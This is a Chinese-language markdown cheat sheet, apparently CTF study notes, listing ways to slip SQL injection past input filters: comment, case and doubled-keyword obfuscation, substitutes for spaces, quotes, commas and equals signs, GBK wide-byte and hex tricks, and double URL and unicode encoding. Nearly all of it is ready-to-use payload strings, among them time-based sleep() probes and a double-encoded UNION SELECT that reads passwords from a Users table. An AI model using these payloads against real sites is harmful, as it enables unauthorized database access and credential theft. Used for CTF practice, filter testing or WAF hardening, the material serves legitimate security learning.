######SQL注入中的绕过

###一.对于关键字的绕过

1. 注释符绕过:`uni/**/on se/**/lect`
2. 大小写绕过:`UniOn SeleCt`
3. 双关键字绕过:`ununionion seselectlect`
4. <>绕过:`unio<>n sel<>ect`(可能是有些网站为了防止xss注入,所以过滤了<>,参照i春秋sql)
5. 对于and,or的绕过其实还可以尝试一下&&,||,[异或注入](https://blog.csdn.net/zpy1998zpy/article/details/80667775)

**这里需要注意一点就是or被过滤的时候order,information中的or也被过滤了**

***

###二.对特殊字符的绕过

* 对空格的绕过:</br>
<pre>两个空格代替一个,用tab键代替空格
`/**/ %20 %09 %0a` 
利用空格绕过:很多关键字都可以写成带括号的形式select(),or()
特殊函数中的空格绕过:ascii(mid(xxfrom(1))) ascii(substr(xxfrom(1)))</pre>

* 对单引号的绕过:</br>
`宽字节 %bf%27 %df%27 %aa%27(争对字符集为GBK时使用`</br>
`十六进制绕过(针对需要输入表名的时候 'user'=>0x7573657273)`</br>

* 对逗号的绕过:
	<pre>
	substr(x,1,1),mid(x,1,1)=>substr(x from 1 for 1) mid(x from 1 for 1)
	limit 0,1=> limit 0 offset 1
	join(本身是用来连接两个表单的,所以join一定是要放在from后面放表单的位置):
	union select 1,2 =>
	union select * from (select 1)a join (select 2)b
	select case when (条件) then (代码1) else (代码2) end 可以对应上if(条件,代码1,代码2)
	if(substring((select user()) from 1 for 1)='e',sleep(5),1)
	可以变为
	select case when substring((select user()) from 1 for 1)='e' then sleep(5) else 1 end
	 </pre>

* 等号的绕过:
<pre>
	利用<>(即不等于号)绕过
	利用like绕过
	利用greatest()绕过(greatest(a,b)返回较大的那个数)
	?id=' or 1 like 1
	?id=' or 1 <> 1
	?id=' union select greatest(substr((select user()),1,1),95)
</pre>

***

###三.其他类型的绕过

* 编码绕过:
<pre>
	* 双重url编码:?id=1%252f%252aUNION%252f%252aSELECT%252f%252a1,2,password%252f%252aFROM%252f%252a/Users--+
	* unicode编码:'=> %u0037 %u02b9
				  空格=> %u0020 %uff00
				  左括号=> %u0028 %uff08
  				  右括号=> %u0029 %uff09
</pre>	

* 相同字符的绕过:</br>
题目中有是可能会出现一种情况:
>它不允许出现某个字符串,但是在数据库中又确实存在这个字符串,再加之mysql与php的编码字符集不相同,便可以利用相似的字符将其绕过

![1.png](https://i.loli.net/2018/09/13/5b9a54128b0b7.png)

可以参考的题目[百度杯十月场look](https://www.ichunqiu.com/battalion)